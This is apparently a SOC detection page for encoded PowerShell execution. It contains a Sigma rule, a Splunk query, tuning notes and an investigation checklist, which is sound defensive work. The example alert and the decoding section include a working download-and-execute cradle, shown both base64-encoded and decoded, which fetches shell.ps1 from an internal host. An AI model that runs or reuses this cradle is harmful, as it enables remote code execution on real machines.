# SIGMA-002: Encoded PowerShell Execution

**Detection ID:** SIGMA-002  
**MITRE ATT&CK:** T1059.001 — Command and Scripting Interpreter: PowerShell  
**Data Source:** Windows Sysmon (Event ID 1) / Windows Security (4688)  
**Severity:** High  
**Status:** ✅ Production

---

## Detection Logic

### Sigma Rule
```yaml
title: Encoded PowerShell Command Execution
status: stable
description: Detects suspicious encoded PowerShell commands (common evasion technique)
logsource:
  product: windows
  category: process_creation
detection:
  selection_encoded:
    CommandLine|contains:
      - '-enc '
      - '-encodedcommand '
      - '-e '
      - 'FromBase64String'
      - '::Decode'
  selection_suspicious:
    CommandLine|contains:
      - 'IEX '
      - 'Invoke-Expression'
      - 'DownloadString'
      - 'Net.WebClient'
      - 'bitsadmin'
  condition: selection_encoded and selection_suspicious
falsepositives:
  - Legitimate IT automation scripts
  - Some enterprise management tools
level: high
tags:
  - attack.t1059.001
  - attack.execution
  - attack.defense_evasion
```

### Splunk SPL Conversion
```spl
index=sysmon EventCode=1 OR index=wineventlog EventCode=4688
| eval cmd_lower=lower(CommandLine)
| where (match(cmd_lower, "(-enc\s|-encodedcommand\s|-e\s|frombase64string|::decode)"))
  AND (match(cmd_lower, "(iex\s|invoke-expression|downloadstring|net\.webclient|bitsadmin)"))
| eval severity="high"
| table _time, Computer, User, CommandLine, ParentImage, sha256
| eval CommandLine=substr(CommandLine, 1, 500)
```

---

## Decoding Procedure

When this alert fires, decode the command:

```powershell
# If -enc flag used
$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA="
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

**Common decoded payloads:**
- Download cradles: `IEX (New-Object Net.WebClient).DownloadString('http://...')`
- Reverse shells
- Credential dumpers
- AMSI bypasses

---

## Tuning Notes

| Challenge | Solution |
|-----------|----------|
| IT automation scripts | Whitelist by ParentImage (SCCM, Puppet, etc.) |
| Short -e flag FPs | Require additional suspicious keyword |
| Long command lines | Truncate display at 500 chars |

**False Positive Rate:** <1% after parent process whitelisting

---

## Real Alert Example

**Alert Details:**
- **Time:** 2026-02-08 14:23:15 UTC
- **Host:** WS-HR-047
- **User:** sarah.chen
- **Command:** `powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=`

**Decoded:** `IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')`

**Investigation Result:** Malware download attempt. Host isolated, confirmed phishing entry.

---

## Investigation Checklist

- [ ] Decode the PowerShell command
- [ ] Check if download URL is malicious (VT, proxy logs)
- [ ] Verify parent process (browser, Office, explorer = suspicious)
- [ ] Check for successful execution (network connections, file creation)
- [ ] Isolate host if malware confirmed

---

**Created:** 2026-01-20  
**Last Modified:** 2026-02-12  
**Analyst:** Joshua Robel
